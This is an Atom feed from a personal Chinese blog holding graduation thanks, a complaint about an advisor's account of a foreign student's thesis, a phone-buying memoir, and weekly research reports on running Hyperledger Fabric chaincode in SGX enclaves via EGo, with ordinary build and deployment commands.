<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>YWZ</title>
  
  <subtitle>Blog</subtitle>
  <link href="https://yiwenzhe.com/atom.xml" rel="self"/>
  
  <link href="https://yiwenzhe.com/"/>
  <updated>2022-04-27T06:27:03.487Z</updated>
  <id>https://yiwenzhe.com/</id>
  
  <author>
    <name>YWZ</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>本科毕业致谢</title>
    <link href="https://yiwenzhe.com/2022/04/27/%E6%9C%AC%E7%A7%91%E6%AF%95%E4%B8%9A%E8%87%B4%E8%B0%A2/"/>
    <id>https://yiwenzhe.com/2022/04/27/%E6%9C%AC%E7%A7%91%E6%AF%95%E4%B8%9A%E8%87%B4%E8%B0%A2/</id>
    <published>2022-04-27T06:23:48.000Z</published>
    <updated>2022-04-27T06:27:03.487Z</updated>
    
    <content type="html"><![CDATA[<!-- excerpt --><p>&emsp;&emsp;时光飞逝，大学四年已接近尾声。想起刚入学那会，自己还青春懵懂，没有目标，只是将学习作为一种任务，只顾成绩而放弃了社交，那会是我成绩最好的时候，也是最遗憾的时候；而如今，自己已经在实验室工作学习了一年，获得了学习之外的许多东西，收获了友情，走出了自己的舒适圈，可以说这是我最精彩的一年。</p><p>&emsp;&emsp;首先，我非常感谢自己。获得保研资格、在实验室努力学习工作，这都是我一步一步争取而来的。感谢前两年努力学习的自己，为保研奠基；感谢后两年拼命竞赛、工作学习的自己，为研究生学习铺路。虽然我才大四毕业，但这一年宛如研究生的第一年，收获很多。</p><p>&emsp;&emsp;感谢我的父母，感谢他们二十几年的辛苦栽培，尽可能让我衣食无忧、专心学习。</p><p>&emsp;&emsp;感谢我的导师王鹃老师。在整个大四一年中，王老师给了我悉心的指导，帮助我解决生活、学习中的各种问题，为我提供了最好的学习环境。</p><p>&emsp;&emsp;感谢我的姐姐姐夫，在我压力如山、最困难最黑暗的时候，是他们倾听了我的每一份抱怨，是他们给我指明方向，给了我学习、坚持下去的希望和动力。感谢我的哥哥，日夜陪伴在我身边，给我生活的寄托与鼓舞，为我排忧解难，因为有你，我不再孤独。</p><p>&emsp;&emsp;感谢AI小组的每一个人，杨梦达学长、徐枭洋学长、李子昂。这半年来我们一起学习进步，一起娱乐生活，一起面对苦难的工作。因为有你们，我才能不断进步，才会更加热爱生活。</p><p>&emsp;&emsp;感谢A402实验室的每一位学长学姐，感谢你们的生活与学习上的陪伴，感谢这个大家庭，和大家在一起真的很快乐。</p><p>&emsp;&emsp;感谢我的室友杨孝彬。感谢你容忍我每天严格的作息时间，容忍我起得早睡得早，谢谢你为了我午休而果断关闭游戏，谢谢你包容我的各种缺点。感谢这四年的同寝生活，有你的陪伴，这四年永生难忘。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本科毕业致谢，感谢你们。&lt;/p&gt;</summary>
    
    
    
    <category term="生活吐槽" scheme="https://yiwenzhe.com/categories/%E7%94%9F%E6%B4%BB%E5%90%90%E6%A7%BD/"/>
    
    
    <category term="生活" scheme="https://yiwenzhe.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>鞭策一则</title>
    <link href="https://yiwenzhe.com/2022/03/12/%E9%9E%AD%E7%AD%96%E4%B8%80%E5%88%99/"/>
    <id>https://yiwenzhe.com/2022/03/12/%E9%9E%AD%E7%AD%96%E4%B8%80%E5%88%99/</id>
    <published>2022-03-12T01:38:00.000Z</published>
    <updated>2022-10-20T03:37:33.553Z</updated>
    
    <content type="html"><![CDATA[<!-- excerpt --><div align="center"><img src="/2022/03/12/%E9%9E%AD%E7%AD%96%E4%B8%80%E5%88%99/f.jpg" width="400" height="534"></div><p>&emsp;&emsp;这是我导师为留学生准备的预毕业申请，其中有如下三个重点：</p><ol><li><p>基本达到了授予学位标准，且达到了留学生培养目标。</p><p>完全胡扯。留学生天天只会看理论书籍，实验都不会做，连基本的Linux命令和Fabric安装都不会，所有的实验都是我做的，哪来的达到了授予学位标准和培养目标。如果是这样的目标，我早就研究生毕业了。</p></li><li><p>毕业资格论文（eFabric: A Privacy Enhancement Extension for Hyperledger Fabric Chaincode based on SGX）已经完成并以投稿到EI期刊Future Internet，目前正在审稿中，录用几率较大。</p><p>一派胡言。整篇论文、实验都是我做的，论文是我一个一个字写的，他没有出任何力，根本不算他的资格论文。并且论文也是我投到期刊的，已经被拒绝了，再说一遍，被拒绝了，Rejected and decline resubmission，拒绝并且拒绝重新提交。是完全被否决了，在2021年2月7日就出了拒绝通知，结果3月11号写录用几率较大？真的很离谱，没必要这样编造谎言。</p></li><li><p>考虑到该生需要申请奖学金，并且计划继续攻读博士</p><p>可拉倒吧，就这水平还申请奖学金，还读博。拿着我的论文申请奖学金，去读博？有这个水平吗？</p></li></ol><p>&emsp;&emsp;这件事情真的让我火冒三丈，无法平息。老师想把留学生送走我可以理解，所以我也答应了帮他写让他早点毕业，可以你整这一出还不通知我，真的很过分，让我很气愤。</p><p>&emsp;&emsp;谨以此事来鞭策自己，无论是受到怎么样的诱惑，都不要读博，读博会被压榨。与其是读博压榨还拿不到钱，为什么不去企业拿着大额工资被压榨呢？</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;一则鞭策，希望能打破自己的幻想。&lt;/p&gt;</summary>
    
    
    
    <category term="生活吐槽" scheme="https://yiwenzhe.com/categories/%E7%94%9F%E6%B4%BB%E5%90%90%E6%A7%BD/"/>
    
    
    <category term="生活" scheme="https://yiwenzhe.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>换新手机有感</title>
    <link href="https://yiwenzhe.com/2022/03/12/%E6%8D%A2%E6%96%B0%E6%89%8B%E6%9C%BA%E6%9C%89%E6%84%9F/"/>
    <id>https://yiwenzhe.com/2022/03/12/%E6%8D%A2%E6%96%B0%E6%89%8B%E6%9C%BA%E6%9C%89%E6%84%9F/</id>
    <published>2022-03-12T01:37:25.000Z</published>
    <updated>2022-03-13T07:22:35.306Z</updated>
    
    <content type="html"><![CDATA[<!-- excerpt --><p>&emsp;&emsp;我的第一台手机是老人机，大概是初中时使用的，初中在镇上上学，每次就把手机藏在包里，等到一周放学后打开与家里通信。再后来，我妈在地摊上以1000块的价格买了两个盗版苹果手机，一个仿iPhone 4一个仿iPhone 4s，都是安卓系统。白色的4s还不错，可以看视频玩游戏，也是我第一个智能手机了。</p><p>&emsp;&emsp;高中一直都没有新手机，本来就都在学校，一个月放假一两天，4s已经可以满足基本需求。那时，每次放假我都会用手机看动漫，如东京喰种、寄生兽、刀剑神域等，现在有些已经被封杀了。胆小的我就爱看这种刺激的，看完一整晚不敢睡觉，也是一段奇妙的经历了。</p><p>&emsp;&emsp;2018年高中结束迈入大学，在我的要求下，家里终于给我买了一台iPhone 8，高考完当晚就买了，是我姐付的钱，忘记爸爸有没有再把钱转给姐姐。iPhone 8非常好用，打游戏看视频便成为我假期的乐趣所在，那时还非常喜欢玩王者荣耀，虽然因为未成年约束，每天只能玩两个小时，也足够了。</p><p>&emsp;&emsp;不幸的是，在2019年8月左右，在去我姐夫家的路上手机被夹坏了。在车上，我妈突然给我姐打了电话，聊了一会又把手机给我，所以为了拿我姐的手机，我的手机就放在膝盖上了。等到下车就忘了这一回事，手机掉在车上，一关门刚好夹到手机，整个手机都夹弯了，无法再使用。手机坏了，伤心在所难免，但这都还是小事。电话那头，我妈知道了这件事，对我大骂，说不应该给我买这么贵的手机，我不配用，到头来还这么粗心搞坏了，也没用多长时间，就应该买一个便宜的。听到这些，我开始痛哭，不是因为手机坏了很伤心，而是自尊受到了伤害，自己太弱小了，没有钱不能独立，手机坏了都没有能力自己买，反而只能依靠父母，依靠他们购买的东西只会成为他们的把柄，永远束缚着我。好在我姐对我真的很好，那时她工资也不高，也没有存款，还是给我买了新的iPhone XR，给了我很多安慰。从此我下定决心，一定要努力攒钱，早日实现财富自由。</p><p>&emsp;&emsp;之后到没出什么大事，我用手机非常小心，怕再次出现这种情况。不过有一次和同学玩王者荣耀，突然手机就充不上电了，换插头换充电线都不行。最后我才意识到可能是手机内部烧坏了，很是担心，我怕又要买新手机，那时我的存款就只有3000左右，我去店铺里面看勉强可以买一个iPhone SE，最坏的情况可以自己花钱再买一个，不用被骂。但我姐和姐夫都觉得是小事，拿去维修一下就好了。我选了上门维修，花了700块，最后也修好了。那时还是太笨了，在手机上选了主板维修，最后也没怎么换主板啥的，如果自己拿去店里面可能花不到几百块。</p><p>&emsp;&emsp;这台iPhone XR一直陪伴到2022年，大学快毕业了。我依靠着学校补助、导师工资、奖学金和每个月的生活费攒下不少钱，可以自费买手机和MacBook了，算是感受到了一点点独立的快乐。所以在38妇女节大促之际，我比较了各种价格，最后下单了这台iPhone 13 Pro，花了8399，旧的iPhone XR也回收了1200，整体下来还算不错。这次经历还算难忘，因为花自己的钱没有任何包袱，可以不用被骂不用遭受道德压力，在此记录下来。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;2022年3月4日晚，我下单了一台iPhone 13 Pro ，以此引发我的回忆。&lt;/p&gt;</summary>
    
    
    
    <category term="生活吐槽" scheme="https://yiwenzhe.com/categories/%E7%94%9F%E6%B4%BB%E5%90%90%E6%A7%BD/"/>
    
    
    <category term="生活" scheme="https://yiwenzhe.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>科研周报6</title>
    <link href="https://yiwenzhe.com/2021/11/12/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A56/"/>
    <id>https://yiwenzhe.com/2021/11/12/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A56/</id>
    <published>2021-11-12T07:28:20.000Z</published>
    <updated>2022-11-06T01:55:18.583Z</updated>
    
    <content type="html"><![CDATA[<!-- excerpt --><br><!-- toc --></p><h1 id="本学期科研规划"><a href="#本学期科研规划" class="headerlink" title="本学期科研规划"></a>本学期科研规划</h1><p>&emsp;&emsp;在fabric区块链中使用sgx技术，将chaincode放入enclave中运行，保护智能合约运行安全。</p><h1 id="本周工作情况和进展"><a href="#本周工作情况和进展" class="headerlink" title="本周工作情况和进展"></a>本周工作情况和进展</h1><p>&emsp;&emsp;上周提出的镜像问题已经解决，在docker镜像池中找到了安装sgx的镜像，镜像中不能安装sgx驱动设备，需要将本机的sgx驱动传递到运行的镜像中。<br>&emsp;&emsp;本周简单画了几个原理图，还需要后续完善：</p><p><div align="center"><img src="/2021/11/12/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A56/1.png" width="500" height="287"></div></p><center style="font-size:16px;color:#000000f;text-decoration:underline">fabric原理图</center> <div align="center"><img src="/2021/11/12/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A56/2.png" width="500" height="215"></div><center style="font-size:16px;color:#000000f;text-decoration:underline">项目运行架构图</center> <div align="center"><img src="/2021/11/12/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A56/3.png" width="500" height="301"></div><center style="font-size:16px;color:#000000f;text-decoration:underline">静态原理图</center> <p>&emsp;&emsp;静态原理图太过于简单，直接就是在chaincode上套上chaincode，后续还需要重新改进。因为程序运行时会创建容器，所以运行图会凸显出容器之间的交互，更为详细，后续需要再添加一些细节。<br>&emsp;&emsp;本周对fabric的运行进行了简单评估。hyperledger下有一个caliper项目，专门用来测试区块链的性能，如延迟Latency、吞吐率Throughput、CPU占用率、内存等，如下：</p><p><div align="center"><img src="/2021/11/12/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A56/4.png"></div></p><h1 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h1><p>&emsp;&emsp;该评估需要编写脚本来测试，因此后续可以测试创建、查询、修改账本的各种性能。<br>&emsp;&emsp;程序运行时间可以通过/usr/bin/time来获取链码安装、调用的时间信息。</p><h1 id="下周工作计划"><a href="#下周工作计划" class="headerlink" title="下周工作计划"></a>下周工作计划</h1><p>&emsp;&emsp;学习caliper使用方法，完善fabric性能测试。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本次周期为2021/11/08 – 2021/11/14。&lt;br&gt;</summary>
    
    
    
    <category term="科研周报" scheme="https://yiwenzhe.com/categories/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A5/"/>
    
    
    <category term="Hyperledger Fabric" scheme="https://yiwenzhe.com/tags/Hyperledger-Fabric/"/>
    
    <category term="SGX" scheme="https://yiwenzhe.com/tags/SGX/"/>
    
    <category term="EGo" scheme="https://yiwenzhe.com/tags/EGo/"/>
    
    <category term="区块链" scheme="https://yiwenzhe.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>科研周报说明</title>
    <link href="https://yiwenzhe.com/2021/11/12/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A5%E8%AF%B4%E6%98%8E/"/>
    <id>https://yiwenzhe.com/2021/11/12/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A5%E8%AF%B4%E6%98%8E/</id>
    <published>2021-11-12T07:27:48.000Z</published>
    <updated>2022-11-06T02:01:17.199Z</updated>
    
    <content type="html"><![CDATA[<!-- excerpt --><br><!-- toc --></p><p>之前做的区块链工作已经发表了，虽然遇到了种种磨难，但也算是好事吧，所以将之前的科研周报陆陆续续放上来。因为一直很忙，所以会更新地很慢，将word一个个转化为markdown也挺麻烦的，业余时间就慢慢放上来吧。</p><p>现在已经换到神经网络隐私保护方向了，不再是孤身一人，而是成为一个小组，挺开心的。因为这个工作是一个连续的过程，也不太好将科研周报放上来，担心泄密（虽然没有多少人看这个博客）。希望以后能多做一些工作吧。</p><p>最后附上区块链工作发表的论文链接与PDF。</p><p>虽然只是一个中文核心，但也算自己的心血了。</p><p>论文知网链接：<a href="https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CJFD&amp;dbname=CJFDLAST2022&amp;filename=XXAQ202207009&amp;uniplatform=NZKPT&amp;v=IzPIW9wyo3h7oRjmsS4mn-pIDmP4wAHdNVoeELxZSNn0Zcc5iSXXOI3td7yC7m_a">一种基于SGX的轻量Fabric链码可信执行环境构建方法</a></p><p>PDF文件：<a href="一种基于SGX的轻量Fabric链码可信执行环境构建方法.pdf">一种基于SGX的轻量Fabric链码可信执行环境构建方法</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;关于科研周报更新的说明&lt;br&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>科研周报5</title>
    <link href="https://yiwenzhe.com/2021/11/05/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A55/"/>
    <id>https://yiwenzhe.com/2021/11/05/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A55/</id>
    <published>2021-11-05T11:10:05.000Z</published>
    <updated>2022-11-06T01:56:17.495Z</updated>
    
    <content type="html"><![CDATA[<!-- excerpt --><br><!-- toc --></p><h1 id="本学期科研规划"><a href="#本学期科研规划" class="headerlink" title="本学期科研规划"></a>本学期科研规划</h1><p>&emsp;&emsp;在fabric区块链中使用sgx技术，将chaincode放入enclave中运行，保护智能合约运行安全。</p><h1 id="本周工作情况和进展"><a href="#本周工作情况和进展" class="headerlink" title="本周工作情况和进展"></a>本周工作情况和进展</h1><p>&emsp;&emsp;本周在上周的基础上，实现ego启动chaincode，让chaincode在enclave中运行。</p><ol><li>Fabric链码关键命令<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">peer lifecycle chaincode package mycc.tar.gz --path abstore --lang golang --label mycc</span><br><span class="line">peer lifecycle chaincode install mycc.tar.gz</span><br><span class="line">peer lifecycle chaincode approveformyorg</span><br><span class="line">peer lifecycle chaincode commit</span><br><span class="line">peer chaincode invoke</span><br></pre></td></tr></table></figure>&emsp;&emsp;fabric2.0使用lifecycle生命周期，命令和fabric1.0差距很大，下图为二者的区别：<div align="center"><img src="/2021/11/05/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A55/1.png"></div></li><li>链码打包<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">peer lifecycle chaincode package mycc.tar.gz --path abstore --lang golang --label mycc</span><br></pre></td></tr></table></figure>&emsp;&emsp;链码打包命令如上图，mycc.tar.gz是打包后的的压缩包，path指明链码路径，lang指明链码语言，lable即链码标签。压缩包内容如下：<br><div align="center"><img src="/2021/11/05/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A55/2.png" width="300" height="126"></div><br>&emsp;&emsp;以go语言为例，压缩包中有code.tar.gz，就是go语言的源码，metadata.json记录链码的语言等信息，内容如下：<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;path&quot;</span>:<span class="string">&quot;github.com/hyperledger/fabric-samples/chaincode/abstore&quot;</span>,<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;golang&quot;</span>,<span class="attr">&quot;label&quot;</span>:<span class="string">&quot;mycc&quot;</span>&#125;</span><br></pre></td></tr></table></figure></li><li>链码安装、编译、运行<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">peer lifecycle chaincode install mycc.tar.gz</span><br></pre></td></tr></table></figure>&emsp;&emsp;上述命令会安装链码、编译并运行。安装过程会将链码包复制重命名，将mycc.tar.gz重命名，放入peer容器的/var/hyperledger/production/lifecycle/chaincodes路径下：<br><div align="center"><img src="/2021/11/05/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A55/3.png"></div><br>&emsp;&emsp;编译过程首先使用第一个镜像，peer会运行hyperledger/fabric-ccenv:latest镜像，启动一个容器编译链码工程，编译后的可执行文件都命名为chaincode，编译脚本如下：<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd chaincode/input/src</span><br><span class="line">GO111MODULE=on go build -v -mod=vendor -ldflags &quot;-linkmode external -extldflags &#x27;-static&#x27;&quot; -o chaincode/output/chaincode    github.com/archive/chaincode-go</span><br></pre></td></tr></table></figure>&emsp;&emsp;因此需要在fabric-ccenv镜像中集成ego编译器，使用ego编译，使可执行程序适配enclave。<br>&emsp;&emsp;然后使用第二个镜像，通过hyperledger/fabric-baseos:latest构建以dev开头的镜像，将可执行程序放入/usr/local/bin下<br>&emsp;&emsp;Dockerfile如下：<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> hyperledger/fabric-baseos:latest</span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> binpackage.tar /usr/<span class="built_in">local</span>/bin</span></span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> org.hyperledger.fabric.chaincode.type=<span class="string">&quot;GOLANG&quot;</span> \</span></span><br><span class="line"><span class="bash">   org.hyperledger.fabric.version=<span class="string">&quot;latest&quot;</span></span></span><br><span class="line"><span class="keyword">ENV</span> CORE_CHAINCODE_BUILDLEVEL=latest</span><br></pre></td></tr></table></figure>&emsp;&emsp;最后peer在dev镜像的基础上创建容器，设置环境变量，运行chaincode：<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chaincode -peer.address=peer0.org1.example.com:7052</span><br></pre></td></tr></table></figure>&emsp;&emsp;运行后链码会注册到peer上，并建立grpc通信，流程如下图：<br><div align="center"><img src="/2021/11/05/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A55/4.jpg" width="300" height="411"></div><br>&emsp;&emsp;因此我将该运行指令进行扩展，先使用ego签名，再ego run运行chaincode。编写如下脚本：<br><div align="center"><img src="/2021/11/05/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A55/5.png" width="300" height="443"></div><br><div align="center"><img src="/2021/11/05/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A55/6.png" width="300" height="85"></div><br>&emsp;&emsp;重要的一点是，由于enclave中的环境变量和文件与外界不通用，所以需要使用配置文件将密钥文件进行挂载，将环境变量传递到enclave中。</li></ol><h1 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h1><p>&emsp;&emsp;由于在自己虚拟机上没有sgx，使用仿真模式运行的，镜像中都没有安装sgx，所以可以成功。但在装配sgx的实机运行时发现镜像中也要安装sgx，运行失败。所以需要再挑选一个配备sgx的镜像或者在镜像中安装sgx，再进行运行测试。<br>&emsp;&emsp;在dockerhub上，有许多配备sgx的ubuntu镜像，单独运行sgx实例可以成功，但在安装ego后便报错，因此需要解决。<br>&emsp;&emsp;在单独的ubuntu镜像上安装sgx驱动时，linux-header中缺少一些文件，导致安装失败。</p><h1 id="下周工作计划"><a href="#下周工作计划" class="headerlink" title="下周工作计划"></a>下周工作计划</h1><ol><li>在docker镜像池中挑选sgx的镜像，或者在ubuntu镜像中安装sgx</li><li>根据fabric框架和ego框架，画出本工程的框架图</li><li>对该工程进行性能测试</li></ol><h1 id="个人反思"><a href="#个人反思" class="headerlink" title="个人反思"></a>个人反思</h1><p>&emsp;&emsp;到现在项目终于快完成了，接下来就是评估测试和调研攻击方法，写一篇完整的论文。时间也比较紧，要在12月底前将论文完成。<br>&emsp;&emsp;能够完成到这一步真的让我很开心，我马上联系了导师，希望能和她汇报一下。导师肯定了我的成果，提出了很多建议，导师也愿意把共同一作或者共同通讯作者给我。能得到赞赏总归是开心的，每次在和导师沟通后我都能开心很久，也有了继续的动力，尤其是这一切都是我踏踏实实做出来的，是我自己的努力。希望接下来能继续完成吧。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本次周期为2021/11/01 – 2021/11/07。&lt;br&gt;</summary>
    
    
    
    <category term="科研周报" scheme="https://yiwenzhe.com/categories/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A5/"/>
    
    
    <category term="Hyperledger Fabric" scheme="https://yiwenzhe.com/tags/Hyperledger-Fabric/"/>
    
    <category term="SGX" scheme="https://yiwenzhe.com/tags/SGX/"/>
    
    <category term="EGo" scheme="https://yiwenzhe.com/tags/EGo/"/>
    
    <category term="区块链" scheme="https://yiwenzhe.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>科研周报4</title>
    <link href="https://yiwenzhe.com/2021/11/02/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A54/"/>
    <id>https://yiwenzhe.com/2021/11/02/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A54/</id>
    <published>2021-11-02T01:23:56.000Z</published>
    <updated>2021-11-02T12:21:04.000Z</updated>
    
    <content type="html"><![CDATA[<!-- excerpt --><br><!-- toc --></p><h1 id="本学期科研规划"><a href="#本学期科研规划" class="headerlink" title="本学期科研规划"></a>本学期科研规划</h1><p>&emsp;&emsp;本学期科研分为三部分：</p><ol><li>简单实现sgx和fabric的结合，并做一些测试</li><li>调研fabric的攻击方法</li><li>针对一种攻击方法，使用sgx进行防御</li></ol><h1 id="本周工作情况和进展"><a href="#本周工作情况和进展" class="headerlink" title="本周工作情况和进展"></a>本周工作情况和进展</h1><p>&emsp;&emsp;本周在分析ego和fabric的工作原理后，发现了之前工作的误区。之前认为fabric的链码是需要交互的，无法单独使用ego运行。实际过程更为复杂，虽然结果看上去是peer调用了chaincode的函数，但实际上chaincode是一个独立的程序，它启动后会自动注册到peer上，建立gRPC链接来通信，然后peer调用chaincode中的函数功能，所以chaincode还是先自主启动，启动gRPC服务，再开始交互，这就说明可以使用ego run运行chaincode。<br>&emsp;&emsp;peer在安装链码时，会将整个链码包（tar.gz包，包含源代码.go和设置文件.json）复制到peer容器中，然后在初始化链码时，首先使用镜像fabric-ccenv来编译链码为可执行程序，然后使用镜像fabric-baseos来启动chaincode容器，运行链码，运行命令为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chaincode -peer.address=saturn:7052</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;因此只要在两个镜像中集成ego，更改编译和运行方式即可。<br>&emsp;&emsp;接下来需完成ego启动的三步：ego-go编译，ego sign签名，ego run运行。<br>&emsp;&emsp;要修改镜像创建文件，安装ego和ertgo编译器。<br>&emsp;&emsp;修改镜像中编译go代码的部分，改为ego-go编译<br>&emsp;&emsp;修改chaincode启动代码部分，先签名，后启动。</p><h1 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h1><p>&emsp;&emsp;目前没有什么问题，整个项目的问题就在于chaincode编译运行过程太过隐式，不在peer或者chaincode源码中设置，而是隐藏在镜像的代码中，很难去发现分析，因此查阅了很多资料，耗费时间。</p><h1 id="下周工作计划"><a href="#下周工作计划" class="headerlink" title="下周工作计划"></a>下周工作计划</h1><p>&emsp;&emsp;实现在镜像中集成ego和ertgo编译器，修改镜像中编译和启动的代码，更改为ego-go编译，ego sign签名，ego run运行即可。<br>&emsp;&emsp;预计下周可以完成。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本次周期为2021/10/25 – 2021/10/31。&lt;br&gt;</summary>
    
    
    
    <category term="科研周报" scheme="https://yiwenzhe.com/categories/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A5/"/>
    
    
    <category term="Hyperledger Fabric" scheme="https://yiwenzhe.com/tags/Hyperledger-Fabric/"/>
    
    <category term="SGX" scheme="https://yiwenzhe.com/tags/SGX/"/>
    
    <category term="EGo" scheme="https://yiwenzhe.com/tags/EGo/"/>
    
    <category term="区块链" scheme="https://yiwenzhe.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>科研周报3</title>
    <link href="https://yiwenzhe.com/2021/11/02/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A53/"/>
    <id>https://yiwenzhe.com/2021/11/02/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A53/</id>
    <published>2021-11-02T01:23:50.000Z</published>
    <updated>2022-11-06T01:54:54.760Z</updated>
    
    <content type="html"><![CDATA[<!-- excerpt --><br><!-- toc --></p><h1 id="本学期科研规划"><a href="#本学期科研规划" class="headerlink" title="本学期科研规划"></a>本学期科研规划</h1><p>&emsp;&emsp;使用sgx技术，给fabric的chaincode创造enclave，并安全运行，在该基础上改进框架，抵御针对区块链或者sgx的一些攻击。</p><h1 id="本周工作情况和进展"><a href="#本周工作情况和进展" class="headerlink" title="本周工作情况和进展"></a>本周工作情况和进展</h1><p>&emsp;&emsp;本周其他事情较多，并且在为新电脑配环境，因此没有什么新的进展。电脑的芯片支持sgx，但是主板不支持，因此在想办法和其他学长调换主板。<br>&emsp;&emsp;在分析ego和fabric时，突然有一个想法，将整个peer执行都放入ego的enclave中。因为上周分析过，ego只能为完整独立的可执行程序创建enclave，直接为chaincode这种需要交互的无法创建。而peer命令会与chaincode交互，也就是说peer运行过程是一个完整独立的过程，因此可以尝试使用ego run peer……来为整个peer运行创建enclave。虽然该方法并不是一个好的解决方案，但可以尝试一下。<br>&emsp;&emsp;首先需要使用改良的编译器ertgo来编译出peer可执行程序，然后用ego sign 为peer签名，使用ego run运行：</p><p><div align="center"><img src="/2021/11/02/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A53/1.png"></div><br>&emsp;&emsp;由上图单独使用ego run peer是可以正常运行的，但在实际的fabric网络中：</p><p><div align="center"><img src="/2021/11/02/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A53/2.png"></div><br>&emsp;&emsp;使用ego run peer来调用invoke，初始化ledger数据，但出错了，显示core文件找不到，core文件是fabric的配置文件，路径已经设置好了，找不到原因可能是enclave与外界隔离了，无法读取core文件。</p><h1 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h1><p>&emsp;&emsp;目前项目还处于分析阶段，ego的原理还未解析清楚，因此工作进度过慢。</p><h1 id="下周工作计划"><a href="#下周工作计划" class="headerlink" title="下周工作计划"></a>下周工作计划</h1><p>&emsp;&emsp;抽时间在新电脑上配置fabric和sgx的硬件运行环境<br>&emsp;&emsp;完成chaincode的enclave运行或者peer的enclave运行。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本次周期为2021/10/18 – 2021/10/24。&lt;br&gt;</summary>
    
    
    
    <category term="科研周报" scheme="https://yiwenzhe.com/categories/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A5/"/>
    
    
    <category term="Hyperledger Fabric" scheme="https://yiwenzhe.com/tags/Hyperledger-Fabric/"/>
    
    <category term="SGX" scheme="https://yiwenzhe.com/tags/SGX/"/>
    
    <category term="EGo" scheme="https://yiwenzhe.com/tags/EGo/"/>
    
    <category term="区块链" scheme="https://yiwenzhe.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>科研周报2</title>
    <link href="https://yiwenzhe.com/2021/10/17/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A52/"/>
    <id>https://yiwenzhe.com/2021/10/17/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A52/</id>
    <published>2021-10-17T11:20:18.000Z</published>
    <updated>2022-11-06T01:54:44.093Z</updated>
    
